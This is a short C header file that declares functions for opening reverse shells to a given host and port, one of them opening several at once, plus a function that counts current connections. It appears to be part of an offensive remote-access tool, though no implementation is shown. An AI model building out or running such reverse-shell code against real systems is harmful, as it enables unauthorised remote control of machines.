#pragma once

void reverse_shell(const char *host, unsigned int port, unsigned int num_shells);
void reverse_shell_classic(const char *host, unsigned int port);
int num_current_connections(const char *host, unsigned int port);
